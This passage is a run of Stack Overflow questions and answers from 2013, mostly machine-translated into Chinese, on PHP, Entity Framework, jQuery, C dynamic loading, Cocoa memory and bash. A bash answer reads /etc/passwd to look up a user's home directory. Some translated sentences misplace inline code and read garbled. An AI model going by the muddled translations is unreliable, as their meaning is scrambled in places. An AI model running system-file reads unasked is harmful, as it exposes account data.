<form action=\"login.php\" method=\"post\"> 
```

And after two posts:

```
<form action=\\\"login.php\\\" method=\\\"post\\\"> 
```

So when I go to use this changed code, it does not work because of all the .

Note: It is not only `"` but also any `'`

I have checked my PHP and SQLite code and can't find any errors, and because it only happens on remote hosts. I tried googling but nothing came up. Might be googling this wrong.

Is there a way to fix this or bypass it?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:06:51.947

`true`如果您调用，远程主机可能会返回`get_magic_quotes_gpc()`。见[http://de3.php.net/manual/en/function.get-magic-quotes-gpc.php](http://de3.php.net/manual/en/function.get-magic-quotes-gpc.php)

# javascript - How do I transform an image to a different size based on a set of control and target coordinates?

> ID：14346888
> 
> 赞同：1
> 
> 时间：2013-01-15T21:04:14.783
> 
> 标签：javascript, matrix, coordinate-transformation

I have a set of control coordinates and a set of target coordinates and I need to figure out how to transform an image over that given set of coordinates. For eg: I want (0,0) of the new image to be (10,20) of the old image or (100, 75) of the new Image to be (40, 30) of the old Image. I dont know if it matters, but I am doing this through javascript.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-19T23:47:31.503

As promised, here is the library I coded to make this happen. It took a lot of research and looking around, but in the end it all paid off. The concept is called Affine Fit Transformation. More info can be found here: [https://github.com/clockwork189/Affinity](https://github.com/clockwork189/Affinity)

# winapi - Interpret Windows Native API call arguments

> ID：14346889
> 
> 赞同：1
> 
> 时间：2013-01-15T21:04:20.533
> 
> 标签：winapi, kernel, kernel32, ntdll, nt-native-api

I am analyzing an executable based on its execution trace. I have obtained the execution trace using [NtTrace](http://www.howzatt.demon.co.uk/NtTrace/) tool. The output is a sequence of native api calls with arguments. I have managed to interpret most of the API calls except the following ones:

```
NtQueryKey( KeyHandle=0x46a, KeyInformationClass=7 [KeyHandleTagsInformation], KeyInformation=0x312c4e0, Length=4, ResultLength=0x312c4dc [4] ) => 0

NtDeviceIoControlFile( FileHandle=0xbe4, Event=0xce8, ApcRoutine=null, ApcContext=null, IoStatusBlock=0x124cf2b0 [0/0xffc], IoControlCode=0x00012017, InputBuffer=0x124cf298, InputBufferLength=0x10, OutputBuffer=null, OutputBufferLength=0 ) => 0 
```

In `NtQueryKey`, how can I map the `KeyHandle=0x46a` to an actual registry key. Further, in `NtDeviceIoControlFile` based on `IoControlCode=0x00012017` is it possible to find whether it is a TCP_RECV, TCP_SEND, etc...

Thank you.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:10:37.650

Sysinternals（现在是 Microsoft 的一部分）的 Process Monitor 将在显示注册表活动时向您显示实际的密钥路径。它还可以监控网络活动。

[系统内部工具](http://sysinternals.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:09:38.930

只需在跟踪中回顾一下，即可找到所处理的密钥被打开的点。如果该键是相对于另一个键打开的，则您可能必须递归地重复此过程。将来，我建议使用来自 sysinternals 的 procmon。输出要好得多。

# java - 使用 Java 的浏览器小程序中的 Web 浏览器

> ID：14346907
> 
> 赞同：1
> 
> 时间：2013-01-15T21:05:11.670
> 
> 标签：java, html, browser, applet

有像[http://www.teamdev.com/jxbrowser/](http://www.teamdev.com/jxbrowser/)这样的 Java 独立浏览器。
有没有办法在网络小程序中制作和运行这样的浏览器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-01T11:25:29.673

[JxBrowser](http://www.teamdev.com/jxbrowser)是一个 Java 库，可以在 Java Applets 中使用。您可以开发自己的 Java Applet 并在其中使用 JxBrowser 的浏览器组件来显示网页。有关如何在 Java 小程序中使用 JxBrowser 的更多信息，[请访问 http://www.teamdev.com/downloads/jxbrowser/docs/JxBrowser-PGuide.html#applet](http://www.teamdev.com/downloads/jxbrowser/docs/JxBrowser-PGuide.html#applet)

# c# - Helpme 使用 EntityFramework 从 SQL 转换为 linq 嵌套 lambda 表达式

> ID：14346909
> 
> 赞同：0
> 
> 时间：2013-01-15T21:05:14.207
> 
> 标签：c#, linq, entity-framework-4, lambda, sql-to-linq-conversion

我正在尝试从 SQL 中获取一些数据，但我无法使用 Linq 在 T-SQL 中完成这项工作：

```
select *
from MTRBatch MB
Inner Join MTR M on MB.Id = M.MTRBatchId
Inner JOIN MTRHeats MH on M.Id = MH.MTRId
LEFT OUTER JOIN Vendor V on MB.VendorId = v.Id
Inner Join Manufacturer MF on MB.ManufacturerId = MF.Id
Where MB.ManufacturerId = 1
AND MH.Heat = 'z01' 
```

我需要所有的树，但需要使用那个过滤器。

我试试这个但没有用：

```
MTRBatches
.Include(x => x.MTRs.Select(m => m.MTRHeats))
.Include(x => x.Manufacturer)
.Include(x => x.Vendor)
.Where(x => (x.Manufacturer.Id == 1));
.Where(x => x.MTRs.Any(m => m.MTRHeats.Any(h => h.Heat == 'z01'))); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:27:46.013

这应该会有所帮助；`dataContext`是您的实例的名称`Entity Framework container`。

```
var result = dataContext.MTRBatches
    .Join(dataContext.MTRs,
        mb => mb.Id,
        mtr => mtr.MTRBatchId,
        (mb, mtr) => new{ Batch = mb, MTR = mtr })
    .Join(dataContext.MTRHeats,
        x => x.MTR.Id,
        mh => mh.MTRId,
        (x, mh) => new{ Batch = x.Batch, MTR = x.MTR, Heat = mh })
    .Join(dataContext.Vendors.DefaultIfEmpty(),
        x => x.Batch.VendorId,
        v => v.Id,
        (x, v) => new{ Batch = x.Batch, MTR = x.MTR, Heat = x.Heat, Vendor = v })
    .Join(dataContext.Manufacturers,
        x => x.Batch.ManufacturerId,
        mf => mf.Id,
        (x, mf) => new{ Batch = x.Batch, MTR = x.MTR, Heat = x.Heat, Vendor = x.Vendor, Manufacturer = mf})
    .Where(x => x.Manufacturer.Id == 1 && x.Heat.Heat == "z01"); 
```

# entity-framework-4 - 使用新实体的实体树更新实体框架数据库 - OptimisticCuncurrencyException

> ID：14346913
> 
> 赞同：0
> 
> 时间：2013-01-15T21:05:24.140
> 
> 标签：entity-framework-4

我有一个包含相关实体集合的实体。

我创建了一个具有相同键的新实体和新的相关实体（集合）。

我已将 ned 相关实体添加到主实体的集合中，现在我想将所有内容保存到数据库中。

我找到了旧实体，它是集合并分离了所有东西。比我附加的新实体和 foreach 循环 - 集合中的所有相关实体。

当我提交时 - context.SaveChanges() 我得到 OptimisticCuncurrencyException 存储更新、插入或删除语句影响了意外的行数 (0)。自加载实体后，实体可能已被修改或删除。刷新 ObjectStateManager 条目。

有任何想法吗 ？

代码：

```
var old = (from c in context.Category.Include("Products").Where(x => (x.CatID== CatID) select c).FirstOrDefault();
            if (old != null)
            {
                context.Detach(old);
                foreach (Product stwp in old.Products)
                {
                    context.Product.Detach(stwp);
                }
            }

            context.Category.Attach(st);
            context.ObjectStateManager.ChangeObjectState(st, System.Data.EntityState.Modified);
            foreach (Product stwp in st.Products)
            {
                context.Product.Attach(stwp);
                context.ObjectStateManager.ChangeObjectState(stwp, System.Data.EntityState.Modified);

            }
            context.SaveChanges(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-20T13:42:59.757

解决方案是先删除所有对象，然后再插入。不是我喜欢的，但没有人提供更好的。

# asp.net - 发送登录凭据后从一个页面重定向到另一个页面

> ID：14346918
> 
> 赞同：0
> 
> 时间：2013-01-15T21:05:49.853
> 
> 标签：asp.net

当我登录到 Web 应用程序 1 时，我想导航到 Web 应用程序 2 而无需手动显式登录。

在应用程序 1 中，我有一个 OnClick，它收集我当前的登录凭据并尝试将它们发布到应用程序 2：

```
 long timestamp = DateTime.Now.Ticks;
    string userName = currentUser.Credentials.UserName;
    string accountName = currentUser.Account.Name;
    string ssoUrl = AppUtil.SalesViewSsoUrl;
    var ssoKey = new Guid(AppUtil.SalesViewHashKey);

    // Build request
    System.Net.WebRequest request = System.Net.WebRequest.Create(ssoUrl);
    string postData = BuildPostString(userName, accountName, timestamp.ToString("x"), ssoKey);
    byte[] postDataBytes = Encoding.Default.GetBytes(postData);

    //Request.Headers.Add("SSOParams", postData);
    //request.Method = "POST";
    //request.ContentType = "application/x-www-form-urlencoded";
    //request.ContentLength = postDataBytes.Length;/

    //Stream sOut = request.GetRequestStream();
    //sOut.Write(postDataBytes, 0, postDataBytes.Length);
    //sOut.Flush();
    //sOut.Close(); 
```

所以，这里的问题是我仍然在同一页面上。我不知道如何进行该基本操作，但仍停留在新登录的应用程序 2 页面上。

有没有其他方法可以发送这些参数而不将它们放入查询字符串中？我想避免这种情况。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:41:44.890

据我所知，您应该使用 ASP.NET Web Config 工具。您还可以手工编写代码。这个网站有很多关于 ASP.NET 的教程。它在 Advanced ASP.NET 部分有一些关于*Authentication and Authorization*等的视频。[曼佐尔教练](http://www.manzoorthetrainer.com/)

# position - 如何在 Game Maker 中找到对象位置？

> ID：14346923
> 
> 赞同：5
> 
> 时间：2013-01-15T21:06:06.063
> 
> 标签：position, game-maker

我现在正在 Game Maker 中制作游戏，但无法弄清楚如何获取对象的确切位置并让另一个对象移动到该位置。有人可以帮帮我吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-16T01:58:44.290

要获取对象的位置，只需使用

```
xpos = instance.x;
ypos = instance.y; 
```

其中 instance 是实例 id（通过某种方法获得，如果实例是对象的唯一实例，则可以使用对象 id）。

要开始向某个位置移动，您应该设置速度和方向：

```
direction = point_direction(x,y, instance.x, instance.y);
speed = WANTEDSPEED; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T18:34:54.647

对象位置是两个变量 (x,y)

您可以像使用任何其他变量（objectName.variable）一样访问它们

因此，正如 paul23 所说，这两个将是：

```
object.x
object.y 
```

要使对象向某个点移动，您可以更好地使用此内置函数：

```
move_towards_point(object.x,object.y,speed) 
```

每次执行时它都会移动`speed`像素，因此您可能希望将其放入 Step 事件中。

# asp.net-mvc - Mvc 不会在 Umbraco 中呈现嵌套母版页

> ID：14346925
> 
> 赞同：0
> 
> 时间：2013-01-15T21:06:15.673
> 
> 标签：asp.net-mvc, razor, umbraco

我有一个名为“RenderBody()”的主模板和一个“OneIn”模板，它是主页面下的子模板。我还在 OneIn 模板中调用了 RenderBody() 函数，但它给了我这个错误：

```
The file "~/Views/OneIn.cshtml" cannot be requested directly because it calls the "RenderSection" method. 
```

“RenderSection”实际上是“renderbody”，我只是在尝试一些新的东西，但它也不起作用

嵌套路径：

```
Master

  -> Homepage

  -> OneIn 

    -> One Column Page 
```

我在所有页面顶部的代码上也有这些行：

```
@inherits Umbraco.Web.Mvc.UmbracoTemplatePage
@{
Layout = "ParentPageName.cshtml";
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T04:17:01.910

是的，我也发现这在来自 Master Templates 时有点刺耳。您可以有多个级别的模板继承，但您的内容页面只能使用最低级别的模板。在您的示例中，这将是一列页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:19:26.820

似乎您有一个尝试直接返回“onein”布局的操作方法，如果您正在调用`RenderSection`或`RenderBody`在其中调用，则不会发生这种情况。感谢任何在其中包含 RenderSection/Body 的视图作为一个`abstract`不能被新编但必须被继承的类！

# javascript - 向页面添加 JavaScript 会增加文本的字体

> ID：14346926
> 
> 赞同：0
> 
> 时间：2013-01-15T21:06:17.780
> 
> 标签：javascript, html

问题是当我向页面添加一些额外的 JavaScript 时，页面上的其余文本会增大字体大小。

下面是我添加到页面的代码示例。

```
<div id='ownedit'>
    <script type='text/javascript' src='https://www.ownedit.com/ownedit_js/ownedit.js?store_id=0866c14cd53fff56724c6fd35e72cd07&anchor=ownedit_banner'></script>
    <script type='text/javascript'>function post_to_owned_it()
    {
        var details ={"order_id":"112",
                    "customer_email":"me@me.com",
                    "order_currency":"USD",
                    "store_name":"LocalHost - Getshopped",
                    "order_value":"16.31",
                    "products":[{"product_name":"Eprocessing Declined",
                                    "product_url":"http:\/\/www.localhost.com:8080\/getshopped\/products-page\/product-category\/eprocessing-declined\/",
                                    "product_desc":"Eprocessing Declined",
                                    "product_price":"16.31",
                                    "currency":"USD",
                                    "product_id":"9",
                                    "product_quantity":"1",
                                    "product_image_url":"http:\/\/www.localhost.com:8080\/getshopped\/wp-content\/plugins\/wp-e-commerce\/wpsc-theme\/wpsc-images\/noimage.png"}
                                ]};
        post_it(details);
    }
    onLoadCallBack(post_to_owned_it);
    </script>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:09:07.137

owndit.js 似乎有一些代码可以操纵你的 css

# visual-studio-2010 - bluestacks 作为 Visual Studio/Mono 中的模拟器

> ID：14346932
> 
> 赞同：3
> 
> 时间：2013-01-15T21:06:50.560
> 
> 标签：visual-studio-2010, android-emulator, bluestacks

使用 Visual Studio 或 Mono 开发应用程序时如何使用 Bluestacks 作为模拟器

# c - 允许 C 中动态加载的库“发布”函数以供使用

> ID：14346934
> 
> 赞同：0
> 
> 时间：2013-01-15T21:06:52.363
> 
> 标签：c, shared-libraries, dynamic-linking, dynamic-library

我正在用 C 语言编写一个程序，它允许用户实现自定义“函数”以由各种解释器运行。我还希望允许用户用纯 C 语言编写这些自定义函数，然后动态加载。为了做到这一点，我创建了两个结构，一个用于解释函数，一个用于本地函数。

这是一个简化的示例：

```
struct func_lang {
    bool is_native;
    char* identifier;
    // various other properties
}

typedef void (*func_native_ptr)(int);
struct func_native {
    bool is_native;
    char* identifier;
    func_native_ptr func_ptr;
} 
```

然后我使用`identifier`每个结构的属性将它们放入一个哈希表中，然后我可以使用它在运行时执行它们。

我的问题实际上来自另一端，加载的库。我希望能够允许加载的库“发布”他们想要插入列表的函数。例如，也许有这样的功能：

```
void register_func_native(char* identifer, func_native_ptr func_ptr); 
```

然后，当我`init`从库中调用一个函数时，他们可以调用这个函数将函数插入到哈希表中。

这行得通吗？我对如何`register_func_native`链接函数有点困惑，因为加载的库需要它，但必须由加载器本身定义。我的加载器功能是否需要在另一个共享库中实现，然后可以在运行时链接？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:25:26.507

它会起作用的。共享库可以看到您在主程序中拥有的所有全局符号。

在主程序中，您需要 dlopen() 和 dlsym() 来调用初始化函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:24:00.907

这将取决于平台，但在 Linux 和我见过的所有 Unix 上，这将起作用。例子：

```
$ cat dll.c
void print(char const *);

void foo()
{
    print("Hello!");
}
$ gcc -Wall -shared -fPIC -o dll.so dll.c
$ cat main.c
#include <dlfcn.h>
#include <stdio.h>

void print(char const *msg)
{
    puts(msg);
}

int main()
{
    void *lib = dlopen("./dll.so", RTLD_NOW);
    void (*foo)() = (void (*)())dlsym(lib, "foo");
    foo();
    return 0;
}
$ cc -fPIC -rdynamic main.c -ldl
$ ./a.out 
Hello! 
```

# vb.net - VB.NET - 事务回滚

> ID：14346936
> 
> 赞同：0
> 
> 时间：2013-01-15T21:07:12.180
> 
> 标签：vb.net, transactions

如果事务既没有提交也没有回滚会发生什么。我正在寻找 SQL Server 和/或 Oracle 的答案。请看下面的代码：

```
Public Sub TransactionTest()
        Try
            Dim intCount As Integer
            Dim sql As SqlTransaction
            Dim objCon As New SqlConnection("Data Source=IANSCOMPUTER;Initial Catalog=Test;Integrated Security=True;MultipleActiveResultSets=true")
            objCon.Open()
            Dim trans As SqlTransaction
            trans = objCon.BeginTransaction
            Dim paramValues(0) As SqlParameter
            paramValues(0) = New SqlParameter("@ID", 1)
            Using (objCon)
                intCount = SqlHelper.ExecuteNonQuery(trans, CommandType.Text, "UPDATE person SET URN=1 WHERE ID2=@ID", paramValues)
                paramValues(0) = New SqlParameter("@ID", 2)
                intCount = SqlHelper.ExecuteNonQuery(trans, CommandType.Text, "UPDATE person SET URN=2 WHERE ID2=@ID", paramValues)
                paramValues(0) = New SqlParameter("@ID", 3)
                intCount = SqlHelper.ExecuteNonQuery(trans, CommandType.Text, "UPDATE person SET URN=3 WHERE ID2=@ID", paramValues)
            End Using
        Catch ex As Exception
            'I do not swallow transactions
        End Try
    End Sub 
```

请注意，它既没有提交也没有回滚。在上述情况下，它似乎会回滚。

我注意到在我家中的 SQL Server 2005 Express 服务器上，当直接在控制台中运行查询时，SQL Studio 管理器会挂起，直到上面的程序完成。在我的工作环境中，情况并非如此，即您可以同时运行查询。这是因为隔离级别吗？因此我有两个问题：

1.  如果事务既没有提交也没有回滚会发生什么。我读过这样的文章：[如果你不在数据库中提交事务会发生什么（比如 SQL Server）](https://stackoverflow.com/questions/4896479/what-happens-if-you-dont-commit-transaction-in-a-database-say-sql-server)。我可以假设事务在 SQL Server 和 Oracle 中回滚吗？
2.  为什么当事务处于活动状态时 SQL Server 在一个环境中挂起，而在另一个环境中却没有？

我正在专门寻找问题 2 的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-25T23:26:34.297

如果您不提交事务，数据库将在您关闭连接时将其回滚，假设您的代码发生了错误。这就是任何严肃的数据库的行为方式。

至于您的第二个问题，我想这与锁定有关，但是如果不了解更多有关您的环境以及谁使用它们，就很难说。

# c# - 以应用程序而非用户身份发布到粉丝页面（但该页面未显示在 /me/accounts 上）

> ID：14346937
> 
> 赞同：0
> 
> 时间：2013-01-15T21:07:20.090
> 
> 标签：c#, facebook-graph-api, sdk

我正在尝试使用 C# Facebook SDK 作为应用程序发布到页面，我浏览了很多解释如何这样做的帖子，我想我明白了，唯一的问题是当我访问 /me/accounts/它只显示我所做的应用程序，它不显示任何页面 我是管理员，除了成为管理员之外，我还需要做什么才能将我要发布到的页面列在 /me/accounts/ 上？非常感谢

# .net - 单元测试实体框架不是代码优先。复合键的“EntityType 没有定义键”

> ID：14346943
> 
> 赞同：0
> 
> 时间：2013-01-15T21:07:53.753
> 
> 标签：.net, integration-testing, entity-framework-5

我正在使用实体框架，试图测试命中它的代码。所有代码都运行良好，但我在测试时遇到了问题。当我在测试时运行此代码时：

```
_entities = new Mock<MyEntities>();
Database.SetInitializer(new DropCreateDatabaseAlways<MyEntities>());
_entities.Object.Database.Initialize(true); 
```

我收到“EntityType 没有定义键”错误。我之前得到这些是因为某些表不遵循将其 id 列命名为“ID”或“[Table Name]ID”的约定。清理完这些后，我仍然可以将它们用于具有复合键的表。就 SQL 而言，它们的定义是正确的。在 EDMX 设计器中，当我单击列时，它们说它们是键。那么如何正确地将它们定义为键呢？我把代码放在哪里？

我尝试查找此内容，所有引用都专门针对 Code First 实现。反正我试过了。他们说要覆盖 DbContext 对象的 OnModelCreating 方法并将其添加到其中：

```
modelBuilder.Entity<Widgets>().HasKey(widget => new { widget.A, widget.B }); 
```

所以我做了一个部分类并试图覆盖它。它已经被覆盖了。所以我去了生成的部分类。这是实现：

```
protected override void OnModelCreating(DbModelBuilder modelBuilder)
{
    throw new UnintentionalCodeFirstException();
} 
```

所以这是不对的。那我现在该怎么办？

我想在我的 Web 项目中基于 EDMX 生成一个测试数据库，这样我就可以创建适当的集成测试。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:43:40.920

如果您使用的是 EDMX，则不能使用数据库初始化（或 onmodelcreating）。这些功能是 Code First 特有的。

所以这里真的没有答案，因为您无法从 EDMX 生成测试数据库。

您可以遵循一些模式来动态创建测试数据库。从我在 2009 年写的一篇博文中粘贴 (http://thedatafarm.com/blog/data-access/unit-testing-in-ef-v1-the-database-conundrum/)

*   复制/粘贴数据库：使用小型 SQL Server Express 数据库作为测试数据库。在特定测试过程中，将 db 文件复制/粘贴到特定位置，然后打开与它的连接。在测试结束时，吹掉文件。

*   事务：在每个数据库访问测试中，将代码包装在 System.Transaction.TransactionScope 中。在测试结束时，不要完成事务，数据库将回滚。

*   数据库脚本：另一个客户正在使用一个小型数据库，他会在每次测试开始时即时生成该数据库，然后在结束时删除数据库。

因此，在您的模型中定义密钥的位置（正如我在推特上建议的那样）。在设计器中，右键单击属于该键的每个实体属性，并确保在上下文菜单上单击“实体键”。然后，EF 将使用这些属性的组合作为它的复合实体键。

希望能帮助到你。

# python - 在文本文件中查找总行数的最快方法

> ID：14346944
> 
> 赞同：0
> 
> 时间：2013-01-15T21:08:10.053
> 
> 标签：python, python-2.7, text-files

> **可能重复：**
> [如何在 Python 中廉价地获得行数？](https://stackoverflow.com/questions/845058/how-to-get-line-count-cheaply-in-python)

想要使用 python 在文本文件中查找总行数，一个简单的解决方案是使用 `open('file.txt') 遍历行并计算它们。

谁能给我介绍一个更好的解决方案？

# ios - “方法调用的参数太多，预期为 1，有 2 个”但实际上只有 1 个

> ID：14346946
> 
> 赞同：-1
> 
> 时间：2013-01-15T21:08:23.647
> 
> 标签：ios, objective-c, cocoa-touch

此代码工作正常：

```
NSString *titleForMail =[NSString stringWithFormat:@"text %@",_infoTFProduct.text];
        [mailCont setSubject:titleForMail]; 
```

虽然这段代码给了我上面的错误。

```
[mailCont setSubject:@"yo! %@", _infoTFProduct.text]; 
```

我很想知道为什么。

![截屏](../Images/f2b30153bf890024cfaf62cf1debf0b6.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T21:11:47.693

因为，好吧，`[mailCont setSubject:@"yo! %@", _infoTFProduct.text];`显然有两个论点？事实上，逗号表示第一个参数的结束和第二个参数的开始。

该语法对于插值字符串并不通用。我相信是唯一可以处理这种参数格式的案例`stringWithFormat:`。`NSLog`

所以很少有接受字符串的方法也接受带有插值参数的字符串。如果要将值插入字符串并在可以使用字符串的任何地方使用它，则必须先使用`[NSString stringWithFormat:]`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:11:58.787

试着把它放在你需要的地方。

`[mailCont setSubject:[NSString stringWithFormat:@"yo! %@", _infoTFProduct.text]];`

# bash - 打印与用户名关联的名称和主目录路径

> ID：14346948
> 
> 赞同：3
> 
> 时间：2013-01-15T21:08:28.810
> 
> 标签：bash, shell, unix

我需要询问用户名并打印与该用户名关联的名称和主目录路径

```
echo Please enter your username
read username 
```

我不确定如何使用 $username 来查找有关其主目录和名称的信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T21:13:51.043

`awk -F: -v v="$username" '{if ($1==v) print $6}' /etc/passwd`

没有awk：

`cat /etc/passwd | grep "$username" | cut -d ":" -f6`

用户名：

`cat /etc/passwd | grep "$username" | cut -d ":" -f5`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T21:57:31.283

```
echo Please enter a username
read username

cat /etc/passwd | grep "$username" | cut -d ":" -f6
cat /etc/passwd | grep "$username" | cut -d ":" -f5 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T22:15:05.690

采用[`getent`](http://man.cx/getent)

```
read -p "username: " username
IFS=: read username password uid gid gecos homedir shell < <(getent passwd "$username")
echo "fullname=${gecos%%,*}"
echo "homedir=$homedir" 
```

# xcode - Xcode 工作区依赖项构建但不打包

> ID：14346950
> 
> 赞同：0
> 
> 时间：2013-01-15T21:08:36.043
> 
> 标签：xcode, build, dependencies, workspace

我有一个带有应用程序和静态库的工作区。该库在项目中使用。

当我修改库并构建应用程序时，库重建得很好：酷！但是如果我没有修改应用程序，新构建的库没有打包在应用程序中，它会让旧的。要拥有新构建的库，我必须修改应用程序（我添加一个空格并删除它）......

我尝试了两种方法：让 Xcode 自动管理依赖项，并在应用程序构建阶段显式添加 lib。

所以如果有人有想法！

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T10:57:52.113

恐怕我不完全明白......你点击'存档'并且.a文件没有与存档中的.app一起包含？

要获取存档中包含的 .a 文件，请设置：
转到`build settings > your static lib > skip install`并将其设置为`NO`

* * *

评论后：您必须触摸应用程序才能将其再次复制到模拟器中。模拟编辑文件应该会有所帮助

您也可以自动执行此操作：
将脚本阶段添加到 lib 的构建阶段并让它运行`touch %PATH_TO_AN_M_FILE_FROM_THE_APP%`

# jquery - Jquery on change 不触发动态内容

> ID：14346954
> 
> 赞同：15
> 
> 时间：2013-01-15T21:08:46.140
> 
> 标签：jquery, ajax

我正在尝试创建一个包含所有动态元素的级联下拉列表。

我的HTML：

```
 <select id="Sites" name="SelectedSiteId"><option value=""></option></select>
 <select id="Sectors" name="SelectedSectorId"><option value=""></option></select> 
```

我有 2 个使用 ajax 加载元素的函数，都可以正常工作：

```
function GetSites() {
        $.ajax({
            url: '/Sites/GetSites',
            dataType: "json",
            type: "POST",
            error: function () {
                alert("An error ocurred.");
            },
            success: function (data) {
                var items = "";
                $.each(data, function (i, item) {
                    items += "<option value=\"" + item.Value + "\">" + item.Text + "</option>";
                });
                $("#Sites").html(items);
            }
        });
    }

    function GetSectors(siteId) {
        $.ajax({
            url: '/Sites/GetSectors',
            data: { siteId: siteId },
            dataType: "json",
            type: "POST",
            error: function () {
                alert("An error ocurred.");
            },
            success: function (data) {
                var items = "";
                $.each(data, function (i, item) {
                    items += "<option value=\"" + item.Value + "\">" + item.Text + "</option>";
                });
                $("#Sectors").html(items);
            }

        });
    } 
```

我需要根据站点选择调用 GetSectors。我有这个：

```
$(document).ready(function () {                       
        $("#Sites").on("change", function (e) {
            var siteId = $("#Sites").val();
            GetSectors(siteId);                
        });

        GetSites();
    }); 
```

但它不起作用。我正在使用 jquery 1.8.3。

任何想法问题出在哪里？

谢谢！

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2013-01-15T21:12:22.303

尝试**事件委托**：

```
$(document).on("change", "#Sites", function(){
    var siteId = this.value;
    GetSectors(siteId);  
}); 
```

> 事件的冒泡行为允许我们进行“事件委托”—— **将处理程序绑定到高级元素，然后检测哪个低级元素发起了事件。**
> 
> 事件委托有两个主要好处。**首先**，它允许我们**绑定更少的事件处理程序**，而不是我们在监听单个元素的点击时必须绑定的，这可能是**一个很大的性能提升**。 **其次**，它允许我们**绑定到父元素**——例如无序列表——并且知道我们的事件处理程序将按**预期触发，即使该父元素的内容发生变化。**

取自：http: [//jqfundamentals.com/chapter/events](http://jqfundamentals.com/chapter/events)

> 委托事件的优点是**它们可以处理来自以后添加到文档的后代元素的事件。通过选择在附加委托事件处理程序时保证存在的元素，您可以使用委托事件来避免频繁附加和删除事件处理程序的需要。**例如，此元素可以是模型-视图-控制器设计中视图的容器元素，或者如果事件处理程序想要监视文档中的所有冒泡事件，则可以是文档。在加载任何其他 HTML 之前，文档元素在文档头部是可用的，**因此在此处附加事件是安全的，而无需等待文档准备好。**

取自：[http ://api.jquery.com/on/](http://api.jquery.com/on/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-05-15T07:10:00.227

我在动态添加内容的绑定更改功能上遇到了同样的问题。我用这个解决了它。希望它可以帮助某人^^

```
$(".select_class").live("change", function(){
   console.log("testing...");
}); 
```

# xcode - 当应用程序终止时，空的新 Cocoa Mac OS X 应用程序有 14799 个“仍然存在”的项目。他们有泄漏吗？

> ID：14346955
> 
> 赞同：3
> 
> 时间：2013-01-15T21:08:46.293
> 
> 标签：xcode, memory-leaks, instruments

当我使用 XCode 4.5 创建一个全新的 Cocoa (Mac OS X) 应用程序时，关闭“基于文档”选项并打开“自动引用计数”，构建，无需更改任何内容，并使用“泄漏”使用 Profiler 运行模板，我看到 19.76 兆的临时内存使用量，以及 2.23 兆字节的“活动字节”，包括 3132 个 CFStrings、1371 个 CFBasicHash 和几百个奇数 mallocs()，其中包括 192 kb 仍由 CoreGraphics 分配，即使程序终止。我在“分配”时间轴中看到了所有这些，但在“泄漏”时间轴中没有输出。我发现这种差异令人困惑。

例如，我想知道一个简单的 Cocoa 基础参考应用程序，如果可能，如果没有，那么我想知道参考技术是什么，以了解哪些泄漏是我的，哪些是预期的。

请注意，使用 Foundation-framework 链接的命令行工具，“开箱即用泄漏”的数量要简单得多，只有大约 18 个 mallocs()，总共 1.06 kb，所以看起来 AppKit (Cocoa) 是大多数默认的“在程序结束时仍在堆上的活动对象，不知何故，没有泄漏”。

是否有某种方法可以制作一个简单的不泄漏 Cocoa 基础参考应用程序，或者框架本身是否泄漏太多（可能是故意的）以至于事实上这是不可能的？

是的，我知道静态分析。是的，我知道垃圾收集。如果有人不想使用垃圾收集，而只使用 ARC，并且想在运行时真正查看泄漏了什么，那么该人可以这样做，而不必忽略基础和框架中的 14799 左右泄漏吗？

**更新：**正如建议的那样，我自己的困惑的来源＃1是我正在查看错误的时间线......但是，在我自己的辩护中（或解释我的困惑），我一直考虑仍然分配的任何对象在程序执行结束时的堆上作为泄漏，这是在 Pascal (Delphi) 和 C++ 世界中普遍观察到的规则，实际上在 Linux 和 Windows 上的大多数非垃圾收集语言中也是如此。也许这根本不是 Objective-C 世界中的“泄漏”？内存时间轴中的“活动项目”是否仍然“在堆上处于活动状态”，这与泄漏有什么不同？我的 AppController 从未被告知“dealloc”这一事实也让我感到惊讶，但有人告诉我，这是“意料之中的”。

![在此处输入图像描述](../Images/26c334af46ab939c670d4caa70d989c4.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T21:31:05.783

这些看起来像是“被创造出来并且仍然存在”的对象。这些不是泄漏，而只是尚未完成其生命周期的对象。由于应用程序仍在运行，因此总会有一组对象仍然存在，但仍有指向它们的指针。

泄漏是仍然存在的对象，但没有指向它的指针。如果没有指针，您就无法将那部分内存返回给操作系统。

要查看实际泄漏，请查看 Instruments 上部的泄漏时间线。发生泄漏时，您将在此时间线中看到一个红色条。围绕此栏设置检查范围以查看下面有关泄漏的详细信息

![在此处输入图像描述](../Images/97e504bd7685bdc6eeb7eb7bd4d8d3a5.png)

# asp.net - IIS 服务器上的内存不足会导致 SQL 超时（单独框中的 SQL Server）吗？

> ID：14346956
> 
> 赞同：6
> 
> 时间：2013-01-15T21:08:48.027
> 
> 标签：asp.net, .net, sql-server, iis, ado.net

